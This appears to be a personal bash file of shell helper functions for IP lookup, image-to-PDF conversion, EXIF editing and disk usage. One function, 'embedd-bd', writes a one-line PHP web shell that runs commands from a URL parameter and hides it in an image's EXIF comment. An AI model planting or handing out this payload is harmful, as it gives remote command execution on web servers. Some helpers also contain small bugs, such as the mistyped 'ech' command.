#!/bin/bash 

# iterate through all subdirs and execute a command
function execr(){
    for dir in */; do
        cd $dir
        $1
        cd ..
    done
}

# Show local/public IP adresses with or without interface argument using a shell
function local-ip(){
    echo -e "local:\n$(ifconfig $1 | grep -oP 'inet (add?r:)?\K(\d{1,3}\.){3}\d{1,3}')\n\npublic:\n$(curl -s sputnick-area.net/ip)";
}

# convert all files in directory in one pdf with pwd name
# imagemagick required
# and this should be changed in /etc/ImageMagick-*/policy.xml
# <policy domain="coder" rights="read | write" pattern="PDF" />
# there was some vulnerability bug in Ghostscript
# check the security advisory before usage
# https://www.ghostscript.com
function all-to-pdf() {
    wd=$(basename $(pwd))
    convert -density 300 -depth 8 -quality 20 -compress jpeg `ls *.[jJ][pP][gG]` $wd.pdf
}

# add file to an image as a comment
# exiftool must be installed
function embedd-to-image() {
    exiftool "-comment<=$1" $2
}

# embed php toy webbackdoor
function embedd-bd() {
    echo "<?php system(\$_GET['cmd']);?>" > bd
    exiftool "-comment<=bd" $1
    rm bd
}

# Analyze the disk usage and sort by size
function size-check() {
    # If no path is entered, use the current directory
    path=${1:-.}
    th=${2:-"500M"}
    ech "Analysing disk usage..."
    du -h -d 1 --threshold=$th $path | sort -hr
}

